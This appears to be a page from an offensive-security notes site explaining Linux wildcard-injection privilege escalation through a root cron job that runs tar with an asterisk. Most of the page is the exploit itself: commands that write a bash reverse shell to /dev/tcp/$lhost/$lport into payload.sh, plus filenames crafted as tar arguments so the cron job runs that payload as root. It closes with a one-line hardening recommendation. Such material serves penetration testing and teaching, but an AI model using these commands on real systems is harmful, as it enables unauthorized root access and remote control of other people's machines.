---
layout: default
title: Wildcards Abuse
parent: Linux
nav_order: 1
permalink: /linux/wildcards/
---

# Wildcards Abuse
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

This vulnerability mainly concerns asterisk (`*`) wildcard. When you are running an Unix shell command, files beginning with hyphen (`-`) will be interpreted as command line arguments. Therefore, if a command containing an asterisk is run and the current folder contains files beginning with hyphen, they will be added to the command as parameters.

This technique allows to perform files ownership hijacking with `chmod` or arbitrary command execution with `tar` to escalate your privileges.

## Prerequisites

* Find a service or a [Cron Job](/linux/cron/) that executes a command as `root` and that contains an asterisk.

## Exploit

For this example, we will assume we have found a [Cron Job](/linux/cron/) run as `root` containing following command.

```bash
# Command goes in /tmp and extract the content of example.tar.gz.
cd /tmp/ && tar -zxvf /tmp/example.tar.gz *
```

The interesting thing can be found in the manual page of tar, doing `man tar`.

```
--checkpoint[=NUMBER]
    display progress messages every NUMBERth record (default 10)

--checkpoint-action=ACTION
    execute ACTION on each checkpoint
```

The goal here is to leverage the asterisk at the end of the command above, replacing them by arguments `--checkpoint` and `--checkpoint-action` to get administrator privileges. But first, since you can create files in `/tmp`, we will put our payload here.

```bash
# Reverse shell here.
cd /tmp/
echo "/bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1" >> payload.sh

# Now create 2 empty files that will be interpreted as command line arguments.
echo "" >> '--checkpoint=1'
echo "" >> '--checkpoint-action=exec=sh payload.sh'
```

Next time the [Cron Job](/linux/cron/) will be executed, asterisk at the end of the command will be interpreted and replaced with the filenames above, executing the following command as `root`.

```bash
cd /tmp/ && tar -zxvf /tmp/example.tar.gz --checkpoint=1 --checkpoint-action=exec=sh payload.sh
```

## Useful links

* The excellent [Unix Wildcards Gone Wild](https://www.exploit-db.com/papers/33930) paper by Leon Juranic.

## Recommendations

- [ ] Avoid using asterisk wildcards on Unix systems, espacially in scripts run as `root`.